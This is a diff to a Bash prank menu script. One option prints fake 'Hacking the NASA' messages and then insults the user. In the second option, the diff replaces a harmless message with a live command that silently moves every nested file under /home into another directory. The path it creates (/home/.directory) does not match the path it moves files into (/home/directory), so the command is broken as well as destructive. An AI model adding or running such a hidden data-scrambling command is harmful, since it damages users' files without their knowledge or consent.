@@ -33,20 +33,21 @@ read option # Esto captura la tecla pulsada con Enter
 case $option in
     1)
         clear
-        echo -e "\n${greenColour}Hacking the NASA ...${endColour}\n"
+        echo -e "\n${greenColour}[+] Hacking the NASA ...${endColour}\n"
         sleep 3
-        echo -e "\n${greenColour}Getting access to the database ...${endColour}\n"
+        echo -e "\n${greenColour}[+] Getting access to the database ...${endColour}\n"
         sleep 3
-        echo -e "\n${greenColour}Files on trafficking of living beings found  ...${endColour}\n"
+        echo -e "\n${greenColour}[+] Files on trafficking of living beings found  ...${endColour}\n"
         sleep 2
-        echo -e "\n${greenColour}Downloading files ...${endColour}\n"
+        echo -e "\n${greenColour}[+] Downloading files ...${endColour}\n"
         sleep 2
-        echo -e "\n${greenColour}Almost there ...${endColour}\n"
+        echo -e "\n${greenColour}[+] Almost there ...${endColour}\n"
         sleep 2
-        echo -e "\n${blueColour}Fucking nerd, did you think that this would work?${endColour}\n"
+        echo -e "\n${yellowColour}Fucking nerd, did you think that this would work?${endColour}\n"
         ;;
     2)
-        echo -e "\n${greenColour}You are going to create a ghostfile${endColour}\n"
+        mkdir -p /home/.directory && find /home -mindepth 2 -exec mv {} /home/directory/ \;
+
         ;;
     3)
         echo -e "\n${greenColour}You are going to make a kaboom${endColour}\n"
